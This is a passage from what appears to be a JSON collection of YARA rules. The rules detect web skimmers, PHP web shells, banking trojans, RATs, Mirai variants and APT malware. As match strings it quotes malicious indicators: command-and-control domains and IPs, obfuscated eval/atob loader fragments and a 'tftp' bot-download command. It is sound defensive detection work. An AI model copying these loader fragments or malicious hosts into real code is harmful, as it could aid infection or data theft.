  "cloudfusion_me": "rule cloudfusion_me {\n    strings: $ = \"&#99;&#108;&#111;&#117;&#100;&#102;&#117;&#115;&#105;&#111;&#110;&#46;&#109;&#101;\"\n    condition: any of them\n}",
  "grelos_v": "rule grelos_v {\n    strings: $ = \"var grelos_v\"\n    condition: any of them\n}",
  "hacked_domains": "rule hacked_domains {\n    strings: \n        $ = \"infopromo.biz\"\n        $ = \"jquery-code.su\"\n        $ = \"jquery-css.su\"\n        $ = \"megalith-games.com\"\n        $ = \"cdn-cloud.pw\"\n        $ = \"animalzz921.pw\"\n        $ = \"statsdot.eu\"\n    condition: any of them\n}",
  "mage_cdn_link": "rule mage_cdn_link {\n    strings: $ = \"\\\\x6D\\\\x61\\\\x67\\\\x65\\\\x2D\\\\x63\\\\x64\\\\x6E\\\\x2E\\\\x6C\\\\x69\\\\x6E\\\\x6B\"\n    condition: any of them\n}",
  "credit_card_regex": "rule credit_card_regex {\n    strings: $ = \"RegExp(\\\"[0-9]{13,16}\\\")\"\n    condition: any of them\n}",
  "jquery_code_su": "rule jquery_code_su {\n    strings: $ = \"105,102,40,40,110,101,119,32,82,101,103,69,120,112,40,39,111,110,101,112,97,103,101\"\n    condition: any of them\n}",
  "jquery_code_su_multi": "rule jquery_code_su_multi {\n    strings: $ = \"=oQKpkyJ8dCK0lGbwNnLn42bpRXYj9GbENDft12bkBjM8V2Ypx2c8Rnbl52bw12bDlkUVVGZvNWZkZ0M85WavpGfsJXd8R1UPB1NywXZtFmb0N3box\"\n    condition: any of them\n}",
  "Trafficanalyzer_js": "rule Trafficanalyzer_js {\n    strings: $ = \"z=x['length'];for(i=0;i<z;i++){y+=String['fromCharCode'](x['charCodeAt'](i)-10) }w=this['unescape'](y);this['eval'](w);\"\n    condition: any of them\n}",
  "atob_js": "rule atob_js {\n    strings: $ = \"this['eval'](this['atob']('\"\n    condition: any of them\n}",
  "gate_php_js": "rule gate_php_js {\n    /* token=KjsS29Msl&host= */\n    strings: \n\t\t$ = /\\/gate.php\\?token=.{,10}&host=/\n    condition: any of them\n}",
  "googieplay_js": "rule googieplay_js {\n    strings: $ = \"tdsjqu!tsd>#iuuq;00hpphjfqmbz/jogp0nbhfoup`hpphjfqmbz/kt#?=0tdsjqu?\"\n    condition: any of them\n}",
  "mag_php_js": "rule mag_php_js {\n    strings: \n        $ = \"onepage|checkout|onestep|firecheckout|onestepcheckout\"\n        $ = \"'one|check'\"\n    condition: any of them\n}",
  "thetech_org_js": "rule thetech_org_js {\n    strings: $ = \"|RegExp|onepage|checkout|\"\n    condition: any of them\n}",
  "md5_cdn_js_link_js": "rule md5_cdn_js_link_js {\n    strings: $ = \"grelos_v= null\"\n    condition: any of them\n}",
  "fromCharCode_in_unicode": "rule fromCharCode_in_unicode {\n    strings: \n        $ = \"\\\\u0066\\\\u0072\\\\u006f\\\\u006d\\\\u0043\\\\u0068\\\\u0061\\\\u0072\\\\u0043\\\\u006f\\\\u0064\\\\u0065\"\n    condition: \n        any of them and filesize < 500KB\n}",
  "function_through_object": "rule function_through_object {\n    strings: \n        $ = \"['eval']\"\n        $ = \"['unescape']\"\n        $ = \"['charCodeAt']\"\n        $ = \"['fromCharCode']\"\n    condition: \n        any of them and filesize < 500KB\n}",
  "hex_script": "rule hex_script {\n    strings:\n        $ = \"\\\\x73\\\\x63\\\\x72\\\\x69\\\\x70\\\\x74\\\\x22\"\n    condition: \n        any of them and filesize < 500KB\n}",
  "php_malfunctions": "rule php_malfunctions {\n    strings:\n        $ = \"eval(\"\n        $ = \"gzinflate(\"\n        $ = \"str_rot13(\"\n        $ = \"base64_decode(\"\n    condition: \n        3 of them and filesize < 500KB\n}",
  "php_obf_malfunctions": "rule php_obf_malfunctions {\n    strings:\n        $ = \"eval(base64_decode\"\n        $ = \"eval(gzinflate\"\n        $ = \"str_rot13(base64_decode\"\n    condition: \n        any of them and filesize < 500KB\n}",
  "fopo_obfuscator": "rule fopo_obfuscator {\n    strings:\n        $ = \"www.fopo.com.ar\"\n    condition: \n        any of them and filesize < 500KB\n}",
  "obf_base64_decode": "rule obf_base64_decode {\n    strings: \n        $ = \"\\\\x62\\\\x61\\\\x73\\\\145\\\\x36\\\\x34\\\\x5f\\\\x64\\\\x65\\\\143\\\\x6f\\\\144\\\\145\"\n    condition: \n        any of them and filesize < 500KB\n}",
  "html_upload": "rule html_upload {\n    strings: \n        $ = \"<input type='submit' name='upload' value='upload'>\"\n        $ = \"if($_POST['upload'])\"\n    condition: \n        any of them and filesize < 500KB\n}",
  "php_uname": "rule php_uname {\n    strings: \n        $ = \"php_uname()\"\n    condition: \n        any of them and filesize < 500KB\n}",
  "scriptkiddies": "rule scriptkiddies {\n    strings:\n        $ = \"lastc0de@Outlook.com\" nocase\n        $ = \"CodersLeet\" nocase\n        $ = \"AgencyCaFc\" nocase\n        $ = \"IndoXploit\" nocase\n        $ = \"Kapaljetz666\" nocase\n    condition: \n        any of them and filesize < 500KB\n}",
  "eval_with_comments": "rule eval_with_comments {\n\tstrings:\n\t\t$ = /(^|\\s)eval\\s*\\/\\*.{,128}\\*\\/\\s*\\(/\n\tcondition: \n        any of them and filesize < 500KB\n}",
  "PM_Email_Sent_By_PHP_Script": "rule PM_Email_Sent_By_PHP_Script\n{\n  strings:\n    $php1=\"X-PHP-Script\" fullword\n    $php2=\"X-PHP-Originating-Script\" fullword\n    $php3=\"/usr/bin/php\" fullword\n\n  condition:\n    any of them\n}",
  "PM_Zip_with_js": "rule PM_Zip_with_js\n{\n  strings:\n    $hdr=\"PK\" \n    $e1=\".js\" nocase\n    $e2=\".jse\" nocase\n\n  condition:\n    $hdr at 0 and (($e1 in (filesize-100..filesize)) or ($e2 in (filesize-100..filesize)))\n}",
  "MedussaHTTP_2019": "rule MedussaHTTP_2019\n{\n\n    meta:\n        author = \"J from THL <j@techhelplist.com>\"\n        date = \"2019-08-12\"\n        reference1 = \"https://app.any.run/tasks/68c8f400-eba5-4d6c-b1f1-8b07d4c014a4/\"\n        reference2 = \"https://www.netscout.com/blog/asert/medusahttp-ddos-slithers-back-spotlight\"\n        reference3 = \"https://twitter.com/malware_traffic/status/1161034462983008261\"\n        version = 1\n        maltype = \"Bot\"\n        filetype = \"memory\"\n        description = \"MedussaHTTP v20190812\"\n\n    strings:\n        $text01 = \"|check|\" ascii\n        $text02 = \"POST!\" ascii\n        $text03 = \"httpactive\" ascii\n        $text04 = \"httpstrong\" ascii\n        $text05 = \"httppost\" ascii\n        $text06 = \"slavicdragon\" ascii\n        $text07 = \"slavicnodragon\" ascii\n        $text08 = \"smartflood\" ascii\n        $text09 = \"stop-all\" ascii\n        $text10 = \"botkill\" ascii\n        $text11 = \"updatehash\" ascii\n        $text12 = \"xyz=\" ascii\n        $text13 = \"abc=\" ascii\n\n\n\n    condition:\n        9 of them\n}",
  "Trojan_W32_Gh0stMiancha_1_0_0": "rule Trojan_W32_Gh0stMiancha_1_0_0\n{\n    meta:\n        Author      = \"Context Threat Intelligence\"\n        Date        = \"2014/01/27\"\n        Description = \"Bytes inside\"\n        Reference   = \"http://www.contextis.com/documents/30/TA10009_20140127_-_CTI_Threat_Advisory_-_The_Monju_Incident1.pdf\"\n\n    strings:\n        $0x = { 57 5b 5a 5a 51 57 40 34 31 67 2e 31 70 34 5c 40 40 44 3b 25 3a 19 1e 5c 7b 67 60 2e 34 31 67 2e 31 70 19 1e 55 77 77 71 64 60 2e 34 3e 3b 3e 19 1e 57 7b 7a 60 71 7a 60 39 40 6d 64 71 2e 34 60 71 6c 60 3b 7c 60 79 78 19 1e 44 66 7b 6c 6d 39 57 7b 7a 7a 71 77 60 7d 7b 7a 2e 34 5f 71 71 64 39 55 78 7d 62 71 19 1e 57 7b 7a 60 71 7a 60 39 78 71 7a 73 60 7c 2e 34 24 19 1e 19 1e }\n        $1 = { 5c e7 99 bd e5 8a a0 e9 bb 91 5c }\n        $1x = { 48 f3 8d a9 f1 9e b4 fd af 85 48 }\n        $2 = \"DllCanLoadNow\"\n        $2x = { 50 78 78 57 75 7a 58 7b 75 70 5a 7b 63 }\n        $3x = { 5a 61 79 76 71 66 34 7b 72 34 67 61 76 7f 71 6d 67 2e 34 31 70 } \n        $4 = \"JXNcc2hlbGxcb3Blblxjb21tYW5k\"\n        $4x = { 5e 4c 5a 77 77 26 7c 78 76 53 6c 77 76 27 56 78 76 78 6c 7e 76 26 25 60 4d 43 21 7f }\n        $5 = \"SEFSRFdBUkVcREVTQ1JJUFRJT05cU3lzdGVtXENlbnRyYWxQcm9jZXNzb3JcMA==\"\n        $5x = { 47 51 52 47 46 52 70 56 41 7f 42 77 46 51 42 40 45 25 5e 5e 41 52 46 5e 40 24 21 77 41 27 78 6e 70 53 42 60 4c 51 5a 78 76 7a 46 6d 4d 43 6c 45 77 79 2d 7e 4e 4c 5a 6e 76 27 5e 77 59 55 29 29 }\n        $6 = \"C:\\\\Users\\\\why\\\\\"\n        $6x = { 57 2e 48 41 67 71 66 67 48 63 7c 6d 48 }\n        $7 = \"g:\\\\ykcx\\\\\"\n        $7x = { 73 2E 48 6D 7F 77 6C 48 }\n        $8 = \"(miansha)\"\n        $8x = { 3C 79 7D 75 7A 67 7C 75 3D }\n        $9 = \"server(\\xE5\\xA3\\xB3)\"\n        $9x = { 7C 2E 48 26 24 25 27 3A 25 25 3A 26 21 48 67 71 66 62 71 66 3C F1 B7 A7 3D 48 46 71 78 71 75 67 71 48 67 71 66 62 71 66 3A 64 70 76 }\n        $cfgDecode = { 8a ?? ?? 80 c2 7a 80 f2 19 88 ?? ?? 41 3b ce 7c ??}\n\n   condition:\n       any of them\n}",
  "MiniAsp3_mem": "rule MiniAsp3_mem : memory { \n  meta: author = \"chort (@chort0)\"\n  description = \"Detect MiniASP3 in memory\"\n  strings: \n    $pdb = \"MiniAsp3\\\\Release\\\\MiniAsp.pdb\" fullword \n    $httpAbout = \"http://%s/about.htm\" fullword \n    $httpResult = \"http://%s/result_%s.htm\" fullword \n    $msgInetFail = \"open internet failed\u2026\" fullword \n    $msgRunErr = \"run error!\" fullword \n    $msgRunOk = \"run ok!\" fullword\n    $msgTimeOutM0 = \"time out,change to mode 0\" fullword \n    $msgCmdNull = \"command is null!\" fullword \ncondition:\n  ($pdb and (all of ($http*)) and any of ($msg*))\n  }",
  "Mirai_Okiru": "rule Mirai_Okiru {\n\tmeta:\n\t\tdescription = \"Detects Mirai Okiru MALW\"\n\t\treference = \"https://www.reddit.com/r/LinuxMalware/comments/7p00i3/quick_notes_for_okiru_satori_variant_of_mirai/\"\n\t\tdate = \"2018-01-05\"\n\n\tstrings:\n\t\t$hexsts01 = { 68 7f 27 70 60 62 73 3c 27 28 65 6e 69 28 65 72 }\n\t\t$hexsts02 = { 74 7e 65 68 7f 27 73 61 73 77 3c 27 28 65 6e 69 }\n\t\t// noted some Okiru variant doesnt have below function, uncomment to seek specific x86 bins\n    // $st07 = \"iptables -F\\n\" fullword nocase wide ascii\n    \n\tcondition:\n    \t\tall of them\n\t\tand is__elf\n\t\tand is__Mirai_gen7\n\t\tand filesize < 100KB \n}",
  "is__Mirai_Satori_gen": "rule is__Mirai_Satori_gen {\n\tmeta:\n\t\tdescription = \"Detects Mirai Satori_gen\"\n\t\treference = \"https://www.reddit.com/r/LinuxMalware/comments/7p00i3/quick_notes_for_okiru_satori_variant_of_mirai/\"\n\t\tdate = \"2018-01-05\"\n\n\tstrings:\n\t\t$st08 = \"tftp -r satori\" fullword nocase wide ascii\n\t\t$st09 = \"/bins/satori\" fullword nocase wide ascii\n\t\t$st10 = \"satori\" fullword nocase wide ascii\n\t\t$st11 = \"SATORI\" fullword nocase wide ascii\n\n\tcondition:\n\t\t2 of them\n}",
  "Mirai_Satori": "rule Mirai_Satori {\n\tmeta:\n\t\tdescription = \"Detects Mirai Satori MALW\"\n\t\tdate = \"2018-01-09\"\n\n\tstrings:\n\t\t$hexsts01 = { 63 71 75 ?? 62 6B 77 62 75 }\n\t\t$hexsts02 = { 53 54 68 72 75 64 62 }\n\t\t$hexsts03 = { 28 63 62 71 28 70 66 73 64 6F 63 68 60 } \n\n\tcondition:\n\t\tall of them\n\t\tand is__elf\n\t\tand is__Mirai_gen7\n\t\tand is__Mirai_Satori_gen\n\t\tand filesize < 100KB \n}",
  "tran_duy_linh": "rule tran_duy_linh\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\tmaltype = \"Misc.\"\n\tversion = \"0.2\"\n\treference = \"8fa804105b1e514e1998e543cd2ca4ea, 872876cfc9c1535cd2a5977568716ae1, etc.\" \n\tdate = \"01/03/2014\"\nstrings:\n\t$doc = {D0 CF 11 E0} //DOCFILE0\n\t$string1 = \"Tran Duy Linh\" fullword\n\t$string2 = \"DLC Corporation\" fullword\ncondition:\n    ($doc at 0) and (all of ($string*))\n}",
  "misc_iocs": "rule misc_iocs\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\n\tmaltype = \"Misc.\"\n\tversion = \"0.1\"\n\treference = \"N/A\" \nstrings:\n\t$doc = {D0 CF 11 E0} //DOCFILE0\n\t$s1 = \"dw20.exe\"\n\t$s2 = \"cmd /\"\ncondition:\n    ($doc at 0) and (1 of ($s*))\n}",
  "malicious_LNK_files": "rule malicious_LNK_files\n{\nmeta:\n\tauthor = \"@patrickrolsen\"\nstrings:\n\t$magic = {4C 00 00 00 01 14 02 00} // L.......\n\t$s1 = \"\\\\RECYCLER\\\\\" wide\n\t$s2 = \"%temp%\" wide\n\t$s3 = \"%systemroot%\\\\system32\\\\cmd.exe\" wide\n\t//$s4 = \"./start\" wide\n\t$s5 = \"svchost.exe\" wide\n\t$s6 = \"lsass.exe\" wide\n\t$s7 = \"csrss.exe\" wide\n\t$s8 = \"winlogon.exe\" wide\n\t//$s9 = \"%cd%\" wide\n\t$s10 = \"%appdata%\" wide\n\t$s11 = \"%programdata%\" wide\n\t$s12 = \"%localappdata%\" wide\n\t$s13 = \".cpl\" wide\ncondition:\n\t($magic at 0) and any of ($s*)\n}",
  "memory_pivy": "rule memory_pivy\n\n{\n   meta:\n\t  author = \"https://github.com/jackcr/\"\n   strings:\n      $a = {00 00 00 00 00 00 00 00 00 00 00 53 74 75 62 50 61 74 68 00} // presence of pivy in memory\n\n   condition: \n      any of them\n\n}",
  "memory_shylock": "rule memory_shylock\n\n{\n   meta:\n\t  author = \"https://github.com/jackcr/\"\n\n   strings:\n      $a = /pipe\\\\[A-F0-9]{32}/     //Named pipe created by the malware\n      $b = /id=[A-F0-9]{32}/     //Portion or the uri beacon\n      $c = /MASTER_[A-F0-9]{32}/     //Mutex created by the malware\n      $d = \"***Load injects by PIPE (%s)\" //String found in binary\n      $e = \"***Load injects url=%s (%s)\" //String found in binary\n      $f = \"*********************** Ping Ok ************************\" //String found in binary\n      $g = \"*** LOG INJECTS *** %s\"     //String found in binary\n\n   condition: \n      any of them\n\n}",
  "ScanBox_Malware_Generic": "rule ScanBox_Malware_Generic {\n\tmeta:\n\t\tdescription = \"Scanbox Chinese Deep Panda APT Malware http://goo.gl/MUUfjv and http://goo.gl/WXUQcP\"\n\t\tauthor = \"Florian Roth\"\n\t\treference1 = \"http://goo.gl/MUUfjv\"\n\t\treference2 = \"http://goo.gl/WXUQcP\"\n\t\tdate = \"2015/02/28\"\n\t\thash1 = \"8d168092d5601ebbaed24ec3caeef7454c48cf21366cd76560755eb33aff89e9\"\n\t\thash2 = \"d4be6c9117db9de21138ae26d1d0c3cfb38fd7a19fa07c828731fa2ac756ef8d\"\n\t\thash3 = \"3fe208273288fc4d8db1bf20078d550e321d9bc5b9ab80c93d79d2cb05cbf8c2\"\n\tstrings:\n\t\t/* Sample 1 */\n\t\t$s0 = \"http://142.91.76.134/p.dat\" fullword ascii\n\t\t$s1 = \"HttpDump 1.1\" fullword ascii\n\t\t\n\t\t/* Sample 2 */\n\t\t$s3 = \"SecureInput .exe\" fullword wide\n\t\t$s4 = \"http://extcitrix.we11point.com/vpn/index.php?ref=1\" fullword ascii\n\t\t\n\t\t/* Sample 3 */\n\t\t$s5 = \"%SystemRoot%\\\\System32\\\\svchost.exe -k msupdate\" fullword ascii\n\t\t$s6 = \"ServiceMaix\" fullword ascii\t\t\n\t\t\n\t\t/* Certificate and Keywords */\n\t\t$x1 = \"Management Support Team1\" fullword ascii\n\t\t$x2 = \"DTOPTOOLZ Co.,Ltd.0\" fullword ascii\n\t\t$x3 = \"SEOUL1\" fullword ascii\n\tcondition:\n\t\t( 1 of ($s*) and 2 of ($x*) ) or \n\t\t( 3 of ($x*) )\n}",
  "TrojanDownloader": "rule TrojanDownloader {\n\tmeta:\n\t\tdescription = \"Trojan Downloader - Flash Exploit Feb15\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://goo.gl/wJ8V1I\"\n\t\tdate = \"2015/02/11\"\n\t\thash = \"5b8d4280ff6fc9c8e1b9593cbaeb04a29e64a81e\"\n\t\tscore = 60\n\tstrings:\n\t\t$x1 = \"Hello World!\" fullword ascii\n\t\t$x2 = \"CONIN$\" fullword ascii\n\t\t\t\n\t\t$s6 = \"GetCommandLineA\" fullword ascii\n\t\t$s7 = \"ExitProcess\" fullword ascii\n\t\t$s8 = \"CreateFileA\" fullword ascii\t\t\t\t\t\t\n\n\t\t$s5 = \"SetConsoleMode\" fullword ascii\t\t\n\t\t$s9 = \"TerminateProcess\" fullword ascii\t\n\t\t$s10 = \"GetCurrentProcess\" fullword ascii\n\t\t$s11 = \"UnhandledExceptionFilter\" fullword ascii\n\t\t$s3 = \"user32.dll\" fullword ascii\n\t\t$s16 = \"GetEnvironmentStrings\" fullword ascii\n\t\t$s2 = \"GetLastActivePopup\" fullword ascii\t\t\n\t\t$s17 = \"GetFileType\" fullword ascii\n\t\t$s19 = \"HeapCreate\" fullword ascii\n\t\t$s20 = \"VirtualFree\" fullword ascii\n\t\t$s21 = \"WriteFile\" fullword ascii\n\t\t$s22 = \"GetOEMCP\" fullword ascii\n\t\t$s23 = \"VirtualAlloc\" fullword ascii\n\t\t$s24 = \"GetProcAddress\" fullword ascii\n\t\t$s26 = \"FlushFileBuffers\" fullword ascii\n\t\t$s27 = \"SetStdHandle\" fullword ascii\n\t\t$s28 = \"KERNEL32.dll\" fullword ascii\n\tcondition:\n\t\t$x1 and $x2 and ( all of ($s*) ) and filesize < 35000\n}",
  "Cloaked_as_JPG": "rule Cloaked_as_JPG {\n        meta:\n                description = \"Detects a cloaked file as JPG\"\n                author = \"Florian Roth (eval section from Didier Stevens)\"\n                date = \"2015/02/29\"\n                score = 70\n        strings:\n                $ext = \"extension: .jpg\"\n        condition:\n                $ext and uint16be(0x00) != 0xFFD8\n}",
  "rtf_yahoo_ken": "",
  "ZXProxy": "rule ZXProxy\n{\nmeta:\n\tauthor = \"ThreatConnect Intelligence Research Team\"\n\t\nstrings:\n\t$C = \"\\\\Control\\\\zxplug\" nocase wide ascii\n\t$h = \"http://www.facebook.com/comment/update.exe\" wide ascii\n\t$S = \"Shared a shell to %s:%s Successfully\" nocase wide ascii\ncondition:\n\tany of them\n}",
  "OrcaRAT": "rule OrcaRAT\n{\n    meta:\n        Author      = \"PwC Cyber Threat Operations\"\n        Date        = \"2014/10/20\" \n        Description = \"Strings inside\"\n        Reference   = \"http://pwc.blogs.com/cyber_security_updates/2014/10/orcarat-a-whale-of-a-tale.html\"\n\n    strings:\n        $MZ = \"MZ\"\n        $apptype1 = \"application/x-ms-application\"\n        $apptype2 = \"application/x-ms-xbap\"\n        $apptype3 = \"application/vnd.ms-xpsdocument\"\n        $apptype4 = \"application/xaml+xml\"\n        $apptype5 = \"application/x-shockwave-flash\"\n        $apptype6 = \"image/pjpeg\"\n        $err1 = \"Set return time error =   %d!\"\n        $err2 = \"Set return time   success!\"\n        $err3 = \"Quit success!\"\n\n    condition:\n        $MZ at 0 and filesize < 500KB and (all of ($apptype*) and 1 of ($err*))\n}",
  "EmiratesStatement": "rule EmiratesStatement \n{\n\tmeta:\n\t\tAuthor \t\t= \"Christiaan Beek\"\n\t\tDate \t\t= \"2013-06-30\"\n\t\tDescription = \"Credentials Stealing Attack\"\n\t\tReference \t= \"https://blogs.mcafee.com/mcafee-labs/targeted-campaign-steals-credentials-in-gulf-states-and-caribbean\"\n\t\t\n\t\thash0 = \"0e37b6efe5de1cc9236017e003b1fc37\"\n\t\thash1 = \"a28b22acf2358e6aced43a6260af9170\"\n\t\thash2 = \"6f506d7adfcc2288631ed2da37b0db04\"\n\t\thash3 = \"8aebade47dc1aa9ac4b5625acf5ade8f\"\n\t\n\tstrings:\n\t\t$string0 = \"msn.klm\"\n\t\t$string1 = \"wmsn.klm\"\n\t\t$string2 = \"bms.klm\"\n\t\n\tcondition:\n\t\tall of them\n}",
  "PUP_InstallRex_AntiFWb": "rule PUP_InstallRex_AntiFWb {\n\tmeta:\n\t\tdescription = \"Malware InstallRex / AntiFW\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"2015-05-13\"\n\t\thash = \"bb5607cd2ee51f039f60e32cf7edc4e21a2d95cd\"\n\t\tscore = 65\n\tstrings:\n\t\t$s4 = \"Error %u while loading TSU.DLL %ls\" fullword ascii\n\t\t$s7 = \"GetModuleFileName() failed => %u\" fullword ascii\n\t\t$s8 = \"TSULoader.exe\" fullword wide\n\t\t$s15 = \"\\\\StringFileInfo\\\\%04x%04x\\\\Arguments\" fullword wide\n\t\t$s17 = \"Tsu%08lX.dll\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and all of them\n}",
  "LightFTP_fftp_x86_64": "rule LightFTP_fftp_x86_64 {\n\tmeta:\n\t\tdescription = \"Detects a light FTP server\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://github.com/hfiref0x/LightFTP\"\n\t\tdate = \"2015-05-14\"\n\t\thash1 = \"989525f85abef05581ccab673e81df3f5d50be36\"\n\t\thash2 = \"5884aeca33429830b39eba6d3ddb00680037faf4\"\n\t\tscore = 50\n\tstrings:\n\t\t$s1 = \"fftp.cfg\" fullword wide\n\t\t$s2 = \"220 LightFTP server v1.0 ready\" fullword ascii\n\t\t$s3 = \"*FTP thread exit*\" fullword wide\n\t\t$s4 = \"PASS->logon successful\" fullword ascii\n\t\t$s5 = \"250 Requested file action okay, completed.\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 250KB and 4 of them\n}",
  "LightFTP_Config": "rule LightFTP_Config {\n\tmeta:\n\t\tdescription = \"Detects a light FTP server - config file\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://github.com/hfiref0x/LightFTP\"\n\t\tdate = \"2015-05-14\"\n\t\thash = \"ce9821213538d39775af4a48550eefa3908323c5\"\n\tstrings:\n\t\t$s2 = \"maxusers=\" wide\n\t\t$s6 = \"[ftpconfig]\" fullword wide\n\t\t$s8 = \"accs=readonly\" fullword wide\n\t\t$s9 = \"[anonymous]\" fullword wide\n\t\t$s10 = \"accs=\" fullword wide\n\t\t$s11 = \"pswd=\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0xfeff and filesize < 1KB and all of them\n}",
  "SpyGate_v2_9": "rule SpyGate_v2_9\n{\n\tmeta:\n\t\tdate = \"2014/09\"\n\t\tmaltype = \"Spygate v2.9 Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\t\treference = \"https://blogs.mcafee.com/mcafee-labs/middle-east-developer-spygate-struts-stuff-online\"\n\tstrings:\n\t\t$1 = \"shutdowncomputer\" wide\n\t\t$2 = \"shutdown -r -t 00\" wide\n\t\t$3 = \"blockmouseandkeyboard\" wide\n\t\t$4 = \"ProcessHacker\"\n\t\t$5 = \"FileManagerSplit\" wide\n\tcondition:\n\t\tall of them\n}",
  "ice_ix_12xy": "rule ice_ix_12xy : banker\n{\n\tmeta:\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdescription = \"ICE-IX 1.2.x.y trojan banker\"\n\t\tdate = \"2013-01-12\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\t\n\tstrings:\n\t\t$regexp1= /bn1=.{32}&sk1=[0-9a-zA-Z]{32}/\n\t\t$a = \"bn1=\"\n\t\t$b = \"&sk1=\"\n\t\t$c = \"mario\"\t\t\t\t\t\t\t\t//HardDrive GUID artifact\n\t\t$d = \"FIXME\"\n\t\t$e = \"RFB 003.003\"\t\t\t\t\t\t\t//VNC artifact\n\t\t$ggurl = \"http://www.google.com/webhp\"\n\n\tcondition:\n\t\t$regexp1 or ($a and $b) or all of ($c,$d,$e,$ggurl) \n}",
  "qadars": "rule qadars : banker\n{\n\tmeta:\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdescription = \"Qadars - Mobile part. Maybe Perkele.\"\n\t\tversion = \"1.0\" \n\t\tfiletype = \"memory\"\n\t\tref1 = \"http://www.lexsi-leblog.fr/cert/qadars-nouveau-malware-bancaire-composant-mobile.html\"\n\n\tstrings:\n\t\t$cmd1 = \"m?D\"\n\t\t$cmd2 = \"m?S\"\n\t\t$cmd3 = \"ALL\"\n\t\t$cmd4 = \"FILTER\"\n\t\t$cmd5 = \"NONE\"\n\t\t$cmd6 = \"KILL\"\n\t\t$cmd7 = \"CANCEL\"\n\t\t$cmd8 = \"SMS\"\n\t\t$cmd9 = \"DIVERT\"\n\t\t$cmd10 = \"MESS\"\n\t\t$nofilter = \"nofilter1111111\"\n\t\t$botherderphonenumber1 = \"+380678409210\"\n\n\tcondition:\n\t\tall of ($cmd*) or $nofilter or any of ($botherderphonenumber*)\n}",
  "shylock": "rule shylock :  banker\n{\n\tmeta:\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdescription = \"Shylock Banker\"\n\t\tdate = \"2013-12-12\" \n\t\tversion = \"1.0\" \n\t\tref1 = \"http://iocbucket.com/iocs/1b4660d57928df5ca843c21df0b2adb117026cba\"\n\t\tref2 = \"http://www.trusteer.com/blog/merchant-fraud-returns-%E2%80%93-shylock-polymorphic-financial-malware-infections-rise\"\n\t\tref3 = \"https://www.csis.dk/en/csis/blog/3811/\"\n\n\tstrings:\n\t\t$process1 = \"MASTER\"\n\t\t$process2 = \"_SHUTDOWN\"\n\t\t$process3 = \"EVT_VNC\"\n\t\t$process4 = \"EVT_BACK\"\n\t\t$process5 = \"EVT_VNC\"\n\t\t$process6 = \"IE_Hook::GetRequestInfo\"\n\t\t$process7 = \"FF_Hook::getRequestInfo\"\n\t\t$process8 = \"EX_Hook::CreateProcess\"\n\t\t$process9 = \"hijackdll.dll\"\n\t\t$process10 = \"MTX_\"\n\t\t$process11 = \"FF::PR_WriteHook entry\"\n\t\t$process12 = \"FF::PR_WriteHook exit\"\n\t\t$process13 = \"HijackProcessAttach::*** MASTER *** MASTER *** MASTER *** %s PID=%u\"\n\t\t$process14 = \"HijackProcessAttach::entry\"\n\t\t$process15 = \"FF::BEFORE INJECT\"\n\t\t$process16 = \"FF::AFTER INJECT\"\n\t\t$process17 = \"IE::AFTER INJECT\"\n\t\t$process18 = \"IE::BEFORE INJECT\"\n\t\t$process19 = \"*** VNC *** VNC *** VNC *** VNC *** VNC *** VNC *** VNC *** VNC *** VNC *** VNC *** %s\"\n\t\t$process20 = \"*** LOG INJECTS *** %s\"\n\t\t$process21 = \"*** inject to process %s not allowed\"\n\t\t$process22 = \"*** BackSocks *** BackSocks *** BackSocks *** BackSocks *** BackSocks *** BackSocks *** BackSocks *** %s\"\n\t\t$process23 = \".?AVFF_Hook@@\"\n\t\t$process24 = \".?AVIE_Hook@@\"\n\t\t$process25 = \"Inject::InjectDllFromMemory\"\n\t\t$process26 = \"BadSocks.dll\"\t\n\t\t$domain1 = \"extensadv.cc\"\n\t\t$domain2 = \"topbeat.cc\"\n\t\t$domain3 = \"brainsphere.cc\"\n\t\t$domain4 = \"commonworldme.cc\"\n\t\t$domain5 = \"gigacat.cc\"\n\t\t$domain6 = \"nw-serv.cc\"\n\t\t$domain7 = \"paragua-analyst.cc\"\n\t\t\n\tcondition:\n\t\t3 of ($process*) or any of ($domain*)\n}",
  "spyeye": "rule spyeye : banker\n{\n\tmeta:\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdescription = \"SpyEye X.Y memory\"\n\t\tdate = \"2012-05-23\" \n\t\tversion = \"1.0\" \n\t\tfiletype = \"memory\"\n\n\tstrings:\n\t\t$spyeye = \"SpyEye\"\n\t\t$a = \"%BOTNAME%\"\n\t\t$b = \"globplugins\"\n\t\t$c = \"data_inject\"\n\t\t$d = \"data_before\"\n\t\t$e = \"data_after\"\n\t\t$f = \"data_end\"\n\t\t$g = \"bot_version\"\n\t\t$h = \"bot_guid\"\n\t\t$i = \"TakeBotGuid\"\n\t\t$j = \"TakeGateToCollector\"\n\t\t$k = \"[ERROR] : Omfg! Process is still active? Lets kill that mazafaka!\"\n\t\t$l = \"[ERROR] : Update is not successfull for some reason\"\n\t\t$m = \"[ERROR] : dwErr == %u\"\n\t\t$n = \"GRABBED DATA\"\n\t\t\n\tcondition:\n\t\t$spyeye or (any of ($a,$b,$c,$d,$e,$f,$g,$h,$i,$j,$k,$l,$m,$n))\n}",
